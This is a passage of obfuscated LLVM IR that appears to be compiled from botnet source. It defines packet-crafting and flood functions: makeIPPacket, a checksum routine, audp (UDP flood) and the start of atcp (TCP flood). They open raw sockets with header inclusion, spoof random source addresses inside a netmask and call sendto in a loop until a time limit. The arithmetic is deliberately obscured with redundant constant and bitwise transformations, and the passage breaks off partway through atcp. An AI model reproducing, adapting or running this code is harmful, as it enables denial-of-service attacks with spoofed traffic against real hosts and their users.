  %86 = load i32, i32* %12, align 4
  %87 = sub i32 0, %86
  %88 = sub i32 0, %84
  %89 = add i32 %87, %88
  %90 = sub i32 0, %89
  %91 = add i32 %86, %84
  store i32 %90, i32* %12, align 4
  %92 = load i32, i32* %11, align 4
  %93 = xor i32 65535, -1
  %94 = xor i32 %92, %93
  %95 = and i32 %94, %92
  %96 = and i32 %92, 65535
  %97 = load i32, i32* %12, align 4
  %98 = sub i32 0, %95
  %99 = sub i32 %97, %98
  %100 = add i32 %97, %95
  store i32 %99, i32* %12, align 4
  %101 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %102 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %101, i32 0, i32 6
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i16
  %105 = call zeroext i16 @htons(i16 zeroext %104) #9
  %106 = zext i16 %105 to i32
  %107 = load i32, i32* %12, align 4
  %108 = sub i32 0, %107
  %109 = sub i32 0, %106
  %110 = add i32 %108, %109
  %111 = sub i32 0, %110
  %112 = add i32 %107, %106
  store i32 %111, i32* %12, align 4
  %113 = load i16, i16* %7, align 2
  %114 = zext i16 %113 to i32
  %115 = load i32, i32* %12, align 4
  %116 = sub i32 %115, 57888166
  %117 = add i32 %116, %114
  %118 = add i32 %117, 57888166
  %119 = add i32 %115, %114
  store i32 %118, i32* %12, align 4
  br label %120

; <label>:120:                                    ; preds = %124, %55
  %121 = load i32, i32* %12, align 4
  %122 = lshr i32 %121, 16
  %123 = icmp ne i32 %122, 0
  br i1 %123, label %124, label %136

; <label>:124:                                    ; preds = %120
  %125 = load i32, i32* %12, align 4
  %126 = xor i32 65535, -1
  %127 = xor i32 %125, %126
  %128 = and i32 %127, %125
  %129 = and i32 %125, 65535
  %130 = load i32, i32* %12, align 4
  %131 = lshr i32 %130, 16
  %132 = sub i32 %128, -152828019
  %133 = add i32 %132, %131
  %134 = add i32 %133, -152828019
  %135 = add i32 %128, %131
  store i32 %134, i32* %12, align 4
  br label %120

; <label>:136:                                    ; preds = %120
  %137 = load i32, i32* %12, align 4
  %138 = xor i32 %137, -1
  %139 = and i32 343597381, %138
  %140 = xor i32 343597381, -1
  %141 = and i32 %137, %140
  %142 = xor i32 -1, -1
  %143 = and i32 %142, 343597381
  %144 = and i32 -1, %140
  %145 = or i32 %139, %141
  %146 = or i32 %143, %144
  %147 = xor i32 %145, %146
  %148 = xor i32 %137, -1
  %149 = trunc i32 %147 to i16
  ret i16 %149
}

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 -16, -1
  %15 = xor i8 %13, %14
  %16 = and i8 %15, %13
  %17 = and i8 %13, -16
  %18 = xor i8 %16, -1
  %19 = xor i8 5, -1
  %20 = xor i8 -44, -1
  %21 = and i8 %18, -44
  %22 = and i8 %16, %20
  %23 = and i8 %19, -44
  %24 = and i8 5, %20
  %25 = or i8 %21, %22
  %26 = or i8 %23, %24
  %27 = xor i8 %25, %26
  %28 = or i8 %18, %19
  %29 = xor i8 %28, -1
  %30 = or i8 -44, %20
  %31 = and i8 %29, %30
  %32 = or i8 %27, %31
  %33 = or i8 %16, 5
  store i8 %32, i8* %12, align 4
  %34 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %35 = bitcast %struct.iphdr* %34 to i8*
  %36 = load i8, i8* %35, align 4
  %37 = xor i8 15, -1
  %38 = xor i8 %36, %37
  %39 = and i8 %38, %36
  %40 = and i8 %36, 15
  %41 = xor i8 %39, -1
  %42 = xor i8 64, -1
  %43 = xor i8 -3, -1
  %44 = and i8 %41, -3
  %45 = and i8 %39, %43
  %46 = and i8 %42, -3
  %47 = and i8 64, %43
  %48 = or i8 %44, %45
  %49 = or i8 %46, %47
  %50 = xor i8 %48, %49
  %51 = or i8 %41, %42
  %52 = xor i8 %51, -1
  %53 = or i8 -3, %43
  %54 = and i8 %52, %53
  %55 = or i8 %50, %54
  %56 = or i8 %39, 64
  store i8 %55, i8* %35, align 4
  %57 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %58 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %57, i32 0, i32 1
  store i8 0, i8* %58, align 1
  %59 = load i32, i32* %10, align 4
  %60 = sext i32 %59 to i64
  %61 = add i64 20, -3437938283340719258
  %62 = add i64 %61, %60
  %63 = sub i64 %62, -3437938283340719258
  %64 = add i64 20, %60
  %65 = trunc i64 %63 to i16
  %66 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %67 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %66, i32 0, i32 2
  store i16 %65, i16* %67, align 2
  %68 = call i32 @rand_cmwc()
  %69 = trunc i32 %68 to i16
  %70 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %71 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %70, i32 0, i32 3
  store i16 %69, i16* %71, align 4
  %72 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %73 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %72, i32 0, i32 4
  store i16 0, i16* %73, align 2
  %74 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %75 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %74, i32 0, i32 5
  store i8 -1, i8* %75, align 4
  %76 = load i8, i8* %9, align 1
  %77 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %78 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %77, i32 0, i32 6
  store i8 %76, i8* %78, align 1
  %79 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %80 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %79, i32 0, i32 7
  store i16 0, i16* %80, align 2
  %81 = load i32, i32* %8, align 4
  %82 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %83 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %82, i32 0, i32 8
  store i32 %81, i32* %83, align 4
  %84 = load i32, i32* %7, align 4
  %85 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i32 0, i32 9
  store i32 %84, i32* %86, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @audp(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

; <label>:31:                                     ; preds = %6
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* %8, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #9
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

; <label>:40:                                     ; preds = %35, %31
  %41 = load i8*, i8** %7, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %40
  br label %313

; <label>:46:                                     ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 8, i32 4, i1 false)
  %49 = load i32, i32* %12, align 4
  store i32 %49, i32* %14, align 4
  %50 = load i32, i32* %10, align 4
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %52, label %114

; <label>:52:                                     ; preds = %46
  %53 = call i32 @socket(i32 2, i32 2, i32 17) #6
  store i32 %53, i32* %15, align 4
  %54 = load i32, i32* %15, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %57, label %56

; <label>:56:                                     ; preds = %52
  br label %313

; <label>:57:                                     ; preds = %52
  %58 = load i32, i32* %11, align 4
  %59 = sub i32 0, 1
  %60 = sub i32 %58, %59
  %61 = add nsw i32 %58, 1
  %62 = sext i32 %60 to i64
  %63 = call noalias i8* @malloc(i64 %62) #6
  store i8* %63, i8** %16, align 8
  %64 = load i8*, i8** %16, align 8
  %65 = icmp eq i8* %64, null
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %57
  br label %313

; <label>:67:                                     ; preds = %57
  %68 = load i8*, i8** %16, align 8
  %69 = load i32, i32* %11, align 4
  %70 = sub i32 0, %69
  %71 = sub i32 0, 1
  %72 = add i32 %70, %71
  %73 = sub i32 0, %72
  %74 = add nsw i32 %69, 1
  %75 = sext i32 %73 to i64
  call void @llvm.memset.p0i8.i64(i8* %68, i8 0, i64 %75, i32 1, i1 false)
  %76 = load i8*, i8** %16, align 8
  %77 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %76, i32 %77)
  %78 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %79 = load i32, i32* %9, align 4
  %80 = sub i32 0, %79
  %81 = sub i32 %78, %80
  %82 = add nsw i32 %78, %79
  store i32 %81, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %83

; <label>:83:                                     ; preds = %106, %105, %67
  %84 = load i32, i32* %15, align 4
  %85 = load i8*, i8** %16, align 8
  %86 = load i32, i32* %11, align 4
  %87 = sext i32 %86 to i64
  %88 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %89 = call i64 @sendto(i32 %84, i8* %85, i64 %87, i32 0, %struct.sockaddr* %88, i32 16)
  %90 = load i32, i32* %18, align 4
  %91 = load i32, i32* %14, align 4
  %92 = icmp eq i32 %90, %91
  br i1 %92, label %93, label %106

; <label>:93:                                     ; preds = %83
  %94 = load i32, i32* %8, align 4
  %95 = icmp eq i32 %94, 0
  br i1 %95, label %96, label %100

; <label>:96:                                     ; preds = %93
  %97 = call i32 @rand_cmwc()
  %98 = trunc i32 %97 to i16
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %98, i16* %99, align 2
  br label %100

; <label>:100:                                    ; preds = %96, %93
  %101 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %102 = load i32, i32* %17, align 4
  %103 = icmp sgt i32 %101, %102
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %100
  br label %113

; <label>:105:                                    ; preds = %100
  store i32 0, i32* %18, align 4
  br label %83

; <label>:106:                                    ; preds = %83
  %107 = load i32, i32* %18, align 4
  %108 = sub i32 0, %107
  %109 = sub i32 0, 1
  %110 = add i32 %108, %109
  %111 = sub i32 0, %110
  %112 = add i32 %107, 1
  store i32 %111, i32* %18, align 4
  br label %83

; <label>:113:                                    ; preds = %104
  br label %313

; <label>:114:                                    ; preds = %46
  %115 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %115, i32* %19, align 4
  %116 = load i32, i32* %19, align 4
  %117 = icmp ne i32 %116, 0
  br i1 %117, label %119, label %118

; <label>:118:                                    ; preds = %114
  br label %313

; <label>:119:                                    ; preds = %114
  store i32 1, i32* %20, align 4
  %120 = load i32, i32* %19, align 4
  %121 = bitcast i32* %20 to i8*
  %122 = call i32 @setsockopt(i32 %120, i32 0, i32 3, i8* %121, i32 4) #6
  %123 = icmp slt i32 %122, 0
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %119
  br label %313

; <label>:125:                                    ; preds = %119
  store i32 50, i32* %21, align 4
  br label %126

; <label>:126:                                    ; preds = %133, %125
  %127 = load i32, i32* %21, align 4
  %128 = add i32 %127, 1032159378
  %129 = add i32 %128, -1
  %130 = sub i32 %129, 1032159378
  %131 = add nsw i32 %127, -1
  store i32 %130, i32* %21, align 4
  %132 = icmp ne i32 %127, 0
  br i1 %132, label %133, label %148

; <label>:133:                                    ; preds = %126
  %134 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %135 = call i32 @rand_cmwc()
  %136 = xor i32 %134, -1
  %137 = and i32 -247733982, %136
  %138 = xor i32 -247733982, -1
  %139 = and i32 %134, %138
  %140 = xor i32 %135, -1
  %141 = and i32 %140, -247733982
  %142 = and i32 %135, %138
  %143 = or i32 %137, %139
  %144 = or i32 %141, %142
  %145 = xor i32 %143, %144
  %146 = xor i32 %134, %135
  call void @srand(i32 %145) #6
  %147 = call i32 @rand() #6
  call void @init_rand(i32 %147)
  br label %126

; <label>:148:                                    ; preds = %126
  %149 = load i32, i32* %10, align 4
  %150 = icmp eq i32 %149, 0
  br i1 %150, label %151, label %152

; <label>:151:                                    ; preds = %148
  store i32 0, i32* %22, align 4
  br label %168

; <label>:152:                                    ; preds = %148
  %153 = load i32, i32* %10, align 4
  %154 = sub i32 0, %153
  %155 = add i32 32, %154
  %156 = sub nsw i32 32, %153
  %157 = shl i32 1, %155
  %158 = add i32 %157, 174119135
  %159 = sub i32 %158, 1
  %160 = sub i32 %159, 174119135
  %161 = sub nsw i32 %157, 1
  %162 = xor i32 %160, -1
  %163 = and i32 -1, %162
  %164 = xor i32 -1, -1
  %165 = and i32 %160, %164
  %166 = or i32 %163, %165
  %167 = xor i32 %160, -1
  store i32 %166, i32* %22, align 4
  br label %168

; <label>:168:                                    ; preds = %152, %151
  %169 = load i32, i32* %11, align 4
  %170 = sext i32 %169 to i64
  %171 = sub i64 0, 28
  %172 = sub i64 0, %170
  %173 = add i64 %171, %172
  %174 = sub i64 0, %173
  %175 = add i64 28, %170
  %176 = call i8* @llvm.stacksave()
  store i8* %176, i8** %23, align 8
  %177 = alloca i8, i64 %174, align 16
  %178 = bitcast i8* %177 to %struct.iphdr*
  store %struct.iphdr* %178, %struct.iphdr** %24, align 8
  %179 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %180 = bitcast %struct.iphdr* %179 to i8*
  %181 = getelementptr i8, i8* %180, i64 20
  %182 = bitcast i8* %181 to %struct.udphdr*
  store %struct.udphdr* %182, %struct.udphdr** %25, align 8
  %183 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %184 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %185 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %184, i32 0, i32 0
  %186 = load i32, i32* %185, align 4
  %187 = load i32, i32* %22, align 4
  %188 = call i32 @getRandomIP(i32 %187)
  %189 = call i32 @htonl(i32 %188) #9
  %190 = load i32, i32* %11, align 4
  %191 = sext i32 %190 to i64
  %192 = sub i64 0, %191
  %193 = sub i64 8, %192
  %194 = add i64 8, %191
  %195 = trunc i64 %193 to i32
  call void @makeIPPacket(%struct.iphdr* %183, i32 %186, i32 %189, i8 zeroext 17, i32 %195)
  %196 = load i32, i32* %11, align 4
  %197 = sext i32 %196 to i64
  %198 = add i64 8, 8172240429301378682
  %199 = add i64 %198, %197
  %200 = sub i64 %199, 8172240429301378682
  %201 = add i64 8, %197
  %202 = trunc i64 %200 to i16
  %203 = call zeroext i16 @htons(i16 zeroext %202) #9
  %204 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %205 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %204, i32 0, i32 0
  %206 = bitcast %union.anon.3* %205 to %struct.anon.4*
  %207 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %206, i32 0, i32 2
  store i16 %203, i16* %207, align 2
  %208 = call i32 @rand_cmwc()
  %209 = trunc i32 %208 to i16
  %210 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %211 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %210, i32 0, i32 0
  %212 = bitcast %union.anon.3* %211 to %struct.anon.4*
  %213 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %212, i32 0, i32 0
  store i16 %209, i16* %213, align 2
  %214 = load i32, i32* %8, align 4
  %215 = icmp eq i32 %214, 0
  br i1 %215, label %216, label %218

; <label>:216:                                    ; preds = %168
  %217 = call i32 @rand_cmwc()
  br label %223

; <label>:218:                                    ; preds = %168
  %219 = load i32, i32* %8, align 4
  %220 = trunc i32 %219 to i16
  %221 = call zeroext i16 @htons(i16 zeroext %220) #9
  %222 = zext i16 %221 to i32
  br label %223

; <label>:223:                                    ; preds = %218, %216
  %224 = phi i32 [ %217, %216 ], [ %222, %218 ]
  %225 = trunc i32 %224 to i16
  %226 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %227 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %226, i32 0, i32 0
  %228 = bitcast %union.anon.3* %227 to %struct.anon.4*
  %229 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %228, i32 0, i32 1
  store i16 %225, i16* %229, align 2
  %230 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %231 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %230, i32 0, i32 0
  %232 = bitcast %union.anon.3* %231 to %struct.anon.4*
  %233 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %232, i32 0, i32 3
  store i16 0, i16* %233, align 2
  %234 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %235 = bitcast %struct.udphdr* %234 to i8*
  %236 = getelementptr inbounds i8, i8* %235, i64 8
  %237 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %236, i32 %237)
  %238 = bitcast i8* %177 to i16*
  %239 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %240 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %239, i32 0, i32 2
  %241 = load i16, i16* %240, align 2
  %242 = zext i16 %241 to i32
  %243 = call zeroext i16 @csum(i16* %238, i32 %242)
  %244 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 7
  store i16 %243, i16* %245, align 2
  %246 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %247 = load i32, i32* %9, align 4
  %248 = sub i32 %246, -1296119967
  %249 = add i32 %248, %247
  %250 = add i32 %249, -1296119967
  %251 = add nsw i32 %246, %247
  store i32 %250, i32* %26, align 4
  store i32 0, i32* %27, align 4
  br label %252

; <label>:252:                                    ; preds = %305, %304, %223
  br label %253

; <label>:253:                                    ; preds = %252
  %254 = load i32, i32* %19, align 4
  %255 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %256 = call i64 @sendto(i32 %254, i8* %177, i64 %174, i32 0, %struct.sockaddr* %255, i32 16)
  %257 = call i32 @rand_cmwc()
  %258 = trunc i32 %257 to i16
  %259 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %260 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %259, i32 0, i32 0
  %261 = bitcast %union.anon.3* %260 to %struct.anon.4*
  %262 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %261, i32 0, i32 0
  store i16 %258, i16* %262, align 2
  %263 = load i32, i32* %8, align 4
  %264 = icmp eq i32 %263, 0
  br i1 %264, label %265, label %267

; <label>:265:                                    ; preds = %253
  %266 = call i32 @rand_cmwc()
  br label %272

; <label>:267:                                    ; preds = %253
  %268 = load i32, i32* %8, align 4
  %269 = trunc i32 %268 to i16
  %270 = call zeroext i16 @htons(i16 zeroext %269) #9
  %271 = zext i16 %270 to i32
  br label %272

; <label>:272:                                    ; preds = %267, %265
  %273 = phi i32 [ %266, %265 ], [ %271, %267 ]
  %274 = trunc i32 %273 to i16
  %275 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %276 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %275, i32 0, i32 0
  %277 = bitcast %union.anon.3* %276 to %struct.anon.4*
  %278 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %277, i32 0, i32 1
  store i16 %274, i16* %278, align 2
  %279 = call i32 @rand_cmwc()
  %280 = trunc i32 %279 to i16
  %281 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 3
  store i16 %280, i16* %282, align 4
  %283 = load i32, i32* %22, align 4
  %284 = call i32 @getRandomIP(i32 %283)
  %285 = call i32 @htonl(i32 %284) #9
  %286 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %287 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %286, i32 0, i32 8
  store i32 %285, i32* %287, align 4
  %288 = bitcast i8* %177 to i16*
  %289 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 2
  %291 = load i16, i16* %290, align 2
  %292 = zext i16 %291 to i32
  %293 = call zeroext i16 @csum(i16* %288, i32 %292)
  %294 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i32 0, i32 7
  store i16 %293, i16* %295, align 2
  %296 = load i32, i32* %27, align 4
  %297 = load i32, i32* %14, align 4
  %298 = icmp eq i32 %296, %297
  br i1 %298, label %299, label %305

; <label>:299:                                    ; preds = %272
  %300 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %301 = load i32, i32* %26, align 4
  %302 = icmp sgt i32 %300, %301
  br i1 %302, label %303, label %304

; <label>:303:                                    ; preds = %299
  br label %311

; <label>:304:                                    ; preds = %299
  store i32 0, i32* %27, align 4
  br label %252

; <label>:305:                                    ; preds = %272
  %306 = load i32, i32* %27, align 4
  %307 = add i32 %306, -1750504446
  %308 = add i32 %307, 1
  %309 = sub i32 %308, -1750504446
  %310 = add i32 %306, 1
  store i32 %309, i32* %27, align 4
  br label %252

; <label>:311:                                    ; preds = %303
  %312 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %312)
  br label %313

; <label>:313:                                    ; preds = %311, %124, %118, %113, %66, %56, %45
  ret void
}

declare i32 @time(...) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #6

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #6

; Function Attrs: noinline nounwind uwtable
define void @atcp(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #9
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %497

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %52, label %51

; <label>:51:                                     ; preds = %45
  br label %497

; <label>:52:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %53 = load i32, i32* %17, align 4
  %54 = bitcast i32* %18 to i8*
  %55 = call i32 @setsockopt(i32 %53, i32 0, i32 3, i8* %54, i32 4) #6
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %52
  br label %497

; <label>:58:                                     ; preds = %52
  %59 = load i32, i32* %11, align 4
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %58
  store i32 0, i32* %19, align 4
  br label %78

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* %11, align 4
  %64 = sub i32 0, %63
  %65 = add i32 32, %64
  %66 = sub nsw i32 32, %63
  %67 = shl i32 1, %65
  %68 = sub i32 %67, 666629120
  %69 = sub i32 %68, 1
  %70 = add i32 %69, 666629120
  %71 = sub nsw i32 %67, 1
  %72 = xor i32 %70, -1
  %73 = and i32 -1, %72
  %74 = xor i32 -1, -1
  %75 = and i32 %70, %74
  %76 = or i32 %73, %75
  %77 = xor i32 %70, -1
  store i32 %76, i32* %19, align 4
  br label %78

; <label>:78:                                     ; preds = %62, %61
  %79 = load i32, i32* %13, align 4
  %80 = sext i32 %79 to i64
  %81 = sub i64 40, 4987524730428025339
  %82 = add i64 %81, %80
  %83 = add i64 %82, 4987524730428025339
  %84 = add i64 40, %80
  %85 = call i8* @llvm.stacksave()
  store i8* %85, i8** %20, align 8
  %86 = alloca i8, i64 %83, align 16
  %87 = bitcast i8* %86 to %struct.iphdr*
  store %struct.iphdr* %87, %struct.iphdr** %21, align 8
  %88 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %89 = bitcast %struct.iphdr* %88 to i8*
  %90 = getelementptr i8, i8* %89, i64 20
  %91 = bitcast i8* %90 to %struct.tcphdr*
  store %struct.tcphdr* %91, %struct.tcphdr** %22, align 8
  %92 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %93 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %94 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %93, i32 0, i32 0
  %95 = load i32, i32* %94, align 4
  %96 = load i32, i32* %19, align 4
  %97 = call i32 @getRandomIP(i32 %96)
  %98 = call i32 @htonl(i32 %97) #9
  %99 = load i32, i32* %13, align 4
  %100 = sext i32 %99 to i64
  %101 = sub i64 0, 20
  %102 = sub i64 0, %100
  %103 = add i64 %101, %102
  %104 = sub i64 0, %103
  %105 = add i64 20, %100
  %106 = trunc i64 %104 to i32
  call void @makeIPPacket(%struct.iphdr* %92, i32 %95, i32 %98, i8 zeroext 6, i32 %106)
  %107 = call i32 @rand_cmwc()
  %108 = trunc i32 %107 to i16
  %109 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
